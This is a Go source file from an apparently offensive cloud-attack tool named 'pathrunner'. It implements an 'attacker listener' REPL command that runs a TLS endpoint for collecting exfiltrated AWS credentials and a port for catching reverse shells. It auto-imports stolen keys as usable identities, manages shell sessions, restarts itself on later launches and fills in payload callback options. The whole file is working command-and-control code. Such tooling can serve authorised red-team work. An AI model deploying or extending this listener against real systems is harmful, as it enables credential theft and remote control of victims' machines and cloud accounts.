package repl

import (
	"fmt"
	"pathrunner/pkg/attacker"
	"pathrunner/pkg/ui"
	"regexp"
	"strconv"
)

// restoreListener checks for a persisted listener config and auto-restarts
// the listener if one was previously running. Called during REPL startup.
func (r *REPL) restoreListener() {
	state, err := attacker.LoadListenerState()
	if err != nil {
		fmt.Printf("[!] Warning: could not load listener state: %v\n", err)
		return
	}
	if state == nil || !state.Enabled {
		return
	}

	config := state.ToConfig()
	fmt.Println("[*] Restoring listener from previous session...")

	// Build the args that listenerStart expects and call it directly
	// to get full callback wiring and option injection
	var args []string
	args = append(args, "--https-port", fmt.Sprintf("%d", config.HTTPSPort))
	args = append(args, "--shell-port", fmt.Sprintf("%d", config.ShellPort))
	if config.BindAddr != "" {
		args = append(args, "--host", config.BindAddr)
	}
	if config.PublicIP != "" {
		args = append(args, "--public-ip", config.PublicIP)
	}

	if err := r.listenerStart(args); err != nil {
		fmt.Printf("[!] Failed to restore listener: %v\n", err)
		// Remove the stale state so we don't retry every launch
		attacker.RemoveListenerState()
	}
}

// cmdAttackerListener handles the "attacker listener" subcommand tree.
func (r *REPL) cmdAttackerListener(args []string) error {
	if len(args) == 0 {
		return r.showAttackerListenerHelp()
	}

	switch args[0] {
	case "start":
		return r.listenerStart(args[1:])
	case "stop":
		return r.listenerStop()
	case "status":
		return r.listenerStatus()
	case "log":
		return r.listenerLog(args[1:])
	case "help":
		return r.showAttackerListenerHelp()
	default:
		return NewInvalidArgumentsError(fmt.Sprintf("unknown listener subcommand: %s. Use 'attacker listener help' for available commands", args[0]))
	}
}

// listenerStart starts the unified listener with optional flag overrides.
func (r *REPL) listenerStart(args []string) error {
	if len(args) > 0 && args[0] == "help" {
		return r.showAttackerListenerStartHelp()
	}

	if r.listener != nil && r.listener.IsRunning() {
		return fmt.Errorf("listener is already running. Use 'attacker listener stop' first")
	}

	config := attacker.DefaultListenerConfig()

	// Parse flags
	if v := extractFlag(args, "--https-port"); v != "" {
		port, err := strconv.Atoi(v)
		if err != nil || port < 1 || port > 65535 {
			return NewInvalidArgumentsError("--https-port must be a valid port number (1-65535)")
		}
		config.HTTPSPort = port
	}
	if v := extractFlag(args, "--shell-port"); v != "" {
		port, err := strconv.Atoi(v)
		if err != nil || port < 1 || port > 65535 {
			return NewInvalidArgumentsError("--shell-port must be a valid port number (1-65535)")
		}
		config.ShellPort = port
	}
	if v := extractFlag(args, "--host"); v != "" {
		config.BindAddr = v
	}
	if v := extractFlag(args, "--public-ip"); v != "" {
		config.PublicIP = v
	}

	if config.HTTPSPort == config.ShellPort {
		return NewInvalidArgumentsError("--https-port and --shell-port must be different")
	}

	fmt.Println("[*] Generating self-signed TLS certificate...")

	listener := attacker.NewUnifiedListener(config)

	// Wire credential callback to identity manager
	listener.OnCredReceived = func(creds attacker.ReceivedCredentials) {
		fmt.Printf("\n[+] Credentials received from %s\n", creds.SourceIP)
		if creds.ARN != "" {
			fmt.Printf("    ARN: %s\n", creds.ARN)
		}
		fmt.Printf("    Access Key: %s...%s\n", creds.AccessKeyID[:4], creds.AccessKeyID[len(creds.AccessKeyID)-4:])

		// Resolve region, falling back to us-east-1 (STS is global)
		credRegion := creds.Region
		if credRegion == "" {
			credRegion = "us-east-1"
		}

		// Generate and sanitize identity name from ARN or source IP
		name := fmt.Sprintf("listener/%s", creds.SourceIP)
		if creds.ARN != "" {
			name = fmt.Sprintf("listener/%s", sanitizeIdentityName(extractRoleName(creds.ARN)))
		}

		// Import directly, bypassing arg parsing to avoid injection from untrusted input
		if err := r.identityManager.AddIdentityFromCredentials(
			creds.AccessKeyID, creds.SecretAccessKey, creds.SessionToken,
			credRegion, name,
		); err != nil {
			fmt.Printf("    [!] Failed to auto-import: %v\n", err)
		} else {
			fmt.Printf("    Imported as identity: %s\n", name)
		}

		// Re-display prompt
		if r.rl != nil {
			r.rl.Write([]byte("\n"))
			r.UpdatePrompt()
		}
	}

	// Wire event callback for inline display (like Metasploit)
	listener.OnEvent = func(event attacker.ListenerEvent) {
		fmt.Printf("\n%s\n", event.FormatEvent())
		if r.rl != nil {
			r.rl.Refresh()
		}
	}

	// Wire shell connection callback -- just notify, don't auto-bridge.
	// Users interact with sessions via the 'sessions' command.
	listener.OnShellConnected = func(session *attacker.ShellSession) {
		fmt.Printf("\n[+] Session %d opened - reverse shell from %s\n", session.ID, session.SourceIP())
		fmt.Println("[*] Use 'sessions' to list and 'sessions -i <id>' to interact.")

		// Re-display prompt
		if r.rl != nil {
			r.rl.Refresh()
		}
	}

	if err := listener.Start(); err != nil {
		return fmt.Errorf("failed to start listener: %v", err)
	}

	r.listener = listener
	resolvedConfig := listener.GetConfig()

	// Persist listener config so it auto-restarts on next pathrunner launch
	listenerState := attacker.NewListenerStateFromConfig(resolvedConfig)
	if err := attacker.SaveListenerState(listenerState); err != nil {
		fmt.Printf("[!] Warning: could not persist listener config: %v\n", err)
	}

	fmt.Printf("[*] Credential collector listening on %s:%d\n", resolvedConfig.BindAddr, resolvedConfig.HTTPSPort)
	fmt.Printf("[*] Shell listener on %s:%d (TLS)\n", resolvedConfig.BindAddr, resolvedConfig.ShellPort)
	if resolvedConfig.PublicIP != "" {
		fmt.Printf("[*] Public IP: %s\n", resolvedConfig.PublicIP)
	}

	// Auto-inject payload options if not already set
	r.injectListenerOptions(resolvedConfig)

	return nil
}

// injectListenerOptions auto-sets payload options based on the running listener config.
// Never overwrites user-set values.
func (r *REPL) injectListenerOptions(config attacker.ListenerConfig) {
	injected := false

	optionDefaults := map[string]string{
		"HTTPS_URL":     fmt.Sprintf("https://%s:%d/collect", config.PublicIP, config.HTTPSPort),
		"LISTENER_IP":   config.PublicIP,
		"LISTENER_PORT": fmt.Sprintf("%d", config.ShellPort),
	}

	if config.PublicIP == "" {
		return
	}

	for key, value := range optionDefaults {
		if existing, ok := r.options[key]; !ok || existing == "" {
			r.options[key] = value
			fmt.Printf("[*] Auto-set %s => %s\n", key, value)
			injected = true
		}
	}

	if !injected {
		fmt.Println("[*] All listener-related options already set, skipping auto-injection.")
	}
}

// listenerStop stops the unified listener and removes the persisted config
// so it won't auto-restart on next launch.
func (r *REPL) listenerStop() error {
	if r.listener == nil || !r.listener.IsRunning() {
		fmt.Println("No listener is running.")
		return nil
	}

	if err := r.listener.Stop(); err != nil {
		return fmt.Errorf("failed to stop listener: %v", err)
	}

	// Remove persisted state so the listener doesn't auto-restart
	if err := attacker.RemoveListenerState(); err != nil {
		fmt.Printf("[!] Warning: could not remove listener state: %v\n", err)
	}

	fmt.Println("[*] Listener stopped.")
	return nil
}

// listenerStatus shows the current listener state.
func (r *REPL) listenerStatus() error {
	if r.listener == nil || !r.listener.IsRunning() {
		fmt.Println("No listener is running.")
		fmt.Println("Use 'attacker listener start' to start the unified listener.")
		return nil
	}

	config := r.listener.GetConfig()
	stats := r.listener.GetStats()
	activeSessionCount := r.listener.SessionManager.ActiveCount()

	fmt.Println("Listener Status:")
	fmt.Println()

	kvPairs := []ui.KV{
		{Key: "Status", Value: "running"},
		{Key: "Creds endpoint", Value: fmt.Sprintf("https://%s:%d/collect  (%d received)", config.PublicIP, config.HTTPSPort, stats.CredsReceived)},
		{Key: "Shell endpoint", Value: fmt.Sprintf("%s:%d (TLS)  (%d total, %d active)", config.PublicIP, config.ShellPort, stats.ShellSessions, activeSessionCount)},
	}

	if config.PublicIP != "" {
		kvPairs = append(kvPairs, ui.KV{Key: "Public IP", Value: config.PublicIP})
	}

	ui.KeyValueTable("", kvPairs)
	fmt.Println()

	return nil
}

// listenerLog shows recent events from the listener log file.
func (r *REPL) listenerLog(args []string) error {
	if len(args) > 0 && args[0] == "help" {
		return r.showAttackerListenerHelp()
	}

	count := 50
	if v := extractFlag(args, "--count"); v != "" {
		n, err := strconv.Atoi(v)
		if err != nil || n < 1 {
			return NewInvalidArgumentsError("--count must be a positive number")
		}
		count = n
	}

	events, err := attacker.ReadRecentEvents(count)
	if err != nil {
		return fmt.Errorf("failed to read listener log: %v", err)
	}

	if len(events) == 0 {
		fmt.Println("No listener events recorded.")
		fmt.Println("Events are logged when the listener receives connections.")
		return nil
	}

	fmt.Printf("Last %d listener events:\n\n", len(events))
	for _, event := range events {
		fmt.Println(event.FormatEvent())
	}
	fmt.Println()

	return nil
}

func (r *REPL) showAttackerListenerHelp() error {
	fmt.Println("Attacker Listener Commands:")
	fmt.Println("  attacker listener start [flags]    - Start the unified listener")
	fmt.Println("  attacker listener stop             - Stop the listener")
	fmt.Println("  attacker listener status           - Show listener state and stats")
	fmt.Println("  attacker listener log [--count N]  - Show recent listener events")
	fmt.Println("  attacker listener help             - Show this help message")
	fmt.Println()
	fmt.Println("The unified listener opens two TLS ports:")
	fmt.Println("  - HTTPS port (default 8443): accepts POST /collect for credential exfiltration")
	fmt.Println("  - Shell port (default 4444): accepts reverse shell connections (TLS)")
	fmt.Println()
	fmt.Println("All inbound connections and events are displayed inline and logged to")
	fmt.Println("~/.pathrunner/listener.log for review with 'attacker listener log'.")
	fmt.Println()
	fmt.Println("Received credentials are auto-imported as identities.")
	fmt.Println("Reverse shell connections are collected as sessions.")
	fmt.Println("Use 'sessions' to list and 'sessions -i <id>' to interact.")
	return nil
}

func (r *REPL) showAttackerListenerStartHelp() error {
	fmt.Println("Attacker Listener Start Command:")
	fmt.Println("  attacker listener start [flags]")
	fmt.Println()
	fmt.Println("Flags:")
	fmt.Println("  --https-port <port>    Credential collection port (default: 8443)")
	fmt.Println("  --shell-port <port>    Reverse shell port (default: 4444)")
	fmt.Println("  --host <addr>          Bind address (default: 0.0.0.0)")
	fmt.Println("  --public-ip <ip>       Override auto-detected public IP")
	fmt.Println()
	fmt.Println("Examples:")
	fmt.Println("  attacker listener start")
	fmt.Println("  attacker listener start --https-port 9443 --shell-port 5555")
	fmt.Println("  attacker listener start --public-ip 203.0.113.5")
	return nil
}

// extractRoleName extracts the role/user name from an ARN.
func extractRoleName(arn string) string {
	// arn:aws:iam::123456789012:role/MyRole -> MyRole
	// arn:aws:sts::123456789012:assumed-role/MyRole/session -> MyRole
	parts := splitARN(arn)
	if len(parts) > 0 {
		return parts[len(parts)-1]
	}
	return arn
}

func splitARN(arn string) []string {
	var result []string
	current := ""
	for _, ch := range arn {
		if ch == '/' || ch == ':' {
			if current != "" {
				result = append(result, current)
			}
			current = ""
		} else {
			current += string(ch)
		}
	}
	if current != "" {
		result = append(result, current)
	}
	return result
}

var safeNamePattern = regexp.MustCompile(`[^a-zA-Z0-9._-]`)

// sanitizeIdentityName strips characters that aren't alphanumeric, dash, underscore, or dot.
// Prevents terminal escape sequences or path traversal from untrusted ARN values.
func sanitizeIdentityName(name string) string {
	sanitized := safeNamePattern.ReplaceAllString(name, "")
	if sanitized == "" {
		return "unknown"
	}
	return sanitized
}
